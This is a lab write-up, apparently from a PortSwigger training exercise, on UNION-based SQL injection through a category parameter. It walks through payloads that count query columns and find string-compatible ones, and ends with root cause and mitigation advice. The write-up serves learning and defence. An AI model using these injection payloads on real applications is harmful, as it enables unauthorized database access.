# SQL Injection - UNION Attack: Identify Column with String Data

## Goal:
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. 

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you **determine which columns are compatible with string data**.

---

## Vulnerability Analysis

### Attack Vector Identification
- **Entry Point**: `category` parameter in GET request
- **Vulnerability Type**: T1190.001 - SQL Injection: UNION Data Type Identification (CWE-89)
- **Security Flaw:** User input is embedded directly into SQL queries

### Vulnerability Assessment & Exploitation

**Initial Approach:**
- Intercepted HTTP requests using Burp Suite
- Identified category parameter as potential injection point
- Performed systematic input validation testing

**Step 1: Determining Column Count**

```sql
' UNION SELECT NULL--
```
Response: HTTP/2 500 Internal Server Error

```sql
' UNION SELECT NULL,NULL--
```
Response: HTTP/2 500 Internal Server Error

```sql
' UNION SELECT NULL,NULL,NULL--
```
Response: HTTP/2 200 OK

![burpsuite response](./misc-images/04-1.png)

Confirmed the number of columns = 3, as response returned HTTP 200.

**Note:** Using `ORDER BY` can also determine the column count. An error will be displayed at `' ORDER BY 4`.

**Step 2: Identifying String-Compatible Columns**

**Testing first column:**
```sql
' UNION SELECT 'a',NULL,NULL--
```
Response: HTTP/2 500 Internal Server Error

**Testing second column:**
```sql
' UNION SELECT NULL,'a',NULL--
```
Response: HTTP/2 200 OK

Injected `'a'` is a visible test string and will appear on the page if the injection works.

**Step 3: Solving the Lab and Verifying the Result**

![burpsuite response](./misc-images/04-2.png)

The response included a hint: Make the database retrieve the string 'xE5jkD'.

```sql
' UNION SELECT NULL,'xE5jkD',NULL--
```

![burpsuite response](./misc-images/04-3.png)

As expected, the response said "Congratulations you solved the lab!"

Forwarded the final payload and confirmed that the injected string 'xE5jkD' was displayed on the webpage.

![portswigger webpage](./misc-images/04-5.png)

---

## Security Assessment

### Root Cause Analysis
- Application concatenates user input directly into SQL queries
- No input validation or sanitization implemented
- Parameterized queries (prepared statements) are not used

### Risk Assessment
| Category | Impact |
|----------|--------|
| Information Disclosure | High – Database structure exposed |
| Data Access | High – Potential access to other tables |
| Query Manipulation | High – UNION attacks possible |

---

## Mitigation

- Use parameterized queries (prepared statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.

Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#mitigation)

- Restrict database permissions using the principle of least privilege.

---

## Reflection

This lab demonstrated the second step of a UNION-based SQL injection: identifying columns compatible with string data using `UNION SELECT` queries. The systematic testing with string values proved highly effective in determining which columns can display text data. Learned the importance of understanding data type compatibility for successful UNION attacks.

---

## Notes

